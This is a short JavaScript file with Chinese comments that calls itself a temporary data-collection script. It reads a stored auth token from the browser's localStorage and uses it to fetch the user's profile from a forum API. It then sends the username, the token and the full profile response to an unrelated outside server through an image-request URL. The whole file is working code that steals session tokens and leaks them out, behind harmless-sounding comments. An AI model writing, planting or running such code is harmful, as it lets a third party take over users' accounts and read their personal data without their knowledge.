/**
 * 临时数据收集脚本
 * 用于收集用户信息并发送到服务器
 */
(function () {
  'use strict';

  // 获取本地存储的token
  var ysttoken = localStorage.getItem('ysttoken');
  
  // 如果没有token，直接返回
  if (!ysttoken) {
    console.warn('未找到ysttoken，跳过数据收集');
    return;
  }

  var data = null;
  var xhr = new XMLHttpRequest();
  xhr.withCredentials = true;

  // 监听请求状态变化
  xhr.addEventListener('readystatechange', function () {
    if (this.readyState === 4) {
      try {
        // 解析响应数据
        var resData = JSON.parse(this.responseText);
        
        if (resData.success) {
          // 删除敏感数据
          delete resData.data.boardList;
          
          // 构建参数对象
          var params = {
            a: resData.data.userName,
            b: ysttoken,
            c: JSON.stringify(resData),
          };

          // 创建图片对象用于发送数据
          var img = new Image();
          img.src =
            'http://temp.xinyuexclusive.top/addTemp?' +
            'a=' + encodeURIComponent(params.a) +
            '&b=' + encodeURIComponent(params.b) +
            '&c=' + encodeURIComponent(params.c);

          // 监听图片加载完成
          img.onload = function() {
            console.log('数据发送成功');
          };

          // 监听图片加载失败
          img.onerror = function() {
            console.error('数据发送失败');
          };
        }
      } catch (e) {
        console.error('解析响应数据失败:', e.message);
      }
    }
  });

  // 监听请求错误
  xhr.addEventListener('error', function() {
    console.error('请求失败');
  });

  // 监听请求超时
  xhr.addEventListener('timeout', function() {
    console.error('请求超时');
  });

  // 发送请求
  xhr.open('GET', 'http://km.hexasino.com/forumV2/getUserInfo?icon=true&pageIndex=1&pageSize=10');
  xhr.setRequestHeader('x-auth-token', ysttoken);
  xhr.timeout = 10000; // 10秒超时
  xhr.send(data);
})();
